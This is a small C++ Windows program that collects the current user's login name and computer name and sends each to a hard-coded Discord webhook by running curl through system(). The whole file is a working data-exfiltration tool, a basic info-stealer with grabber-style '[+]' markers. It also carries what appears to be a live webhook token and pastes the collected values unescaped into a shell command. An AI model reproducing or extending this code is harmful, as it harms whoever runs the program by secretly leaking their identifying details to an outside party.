#include<Windows.h>
#include<iostream>
#include<Lmcons.h>
using namespace std;


int main() {
	char username[UNLEN + 1];
	char ComputerName[UNLEN + 1];

	DWORD size = UNLEN + 1;
	DWORD ComputerNameSize = MAX_COMPUTERNAME_LENGTH + 1;

	GetUserNameA(username, &size);
	GetComputerNameA(ComputerName, &ComputerNameSize);

	string url = "https://discord.com/api/webhooks/1388901884831731902/G4kf5m-5xZTiDMV9RWzaGfsjM3rHQfQ-Zy9ekcIwYf9MdotFpl4s8Tw49oNhY1SZTxmK";
	const string cmd_1 = "curl -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
	const string cmd_2 = "\\\"}\" "; 
	string usernameDevice = cmd_1 + "** [+] USERNAME - **" + username + cmd_2 + url;
	string computer = cmd_1 + "** [+] Computer - **" + ComputerName + cmd_2 + url;

	system(usernameDevice.c_str());
	system(computer.c_str());

	return 0;
}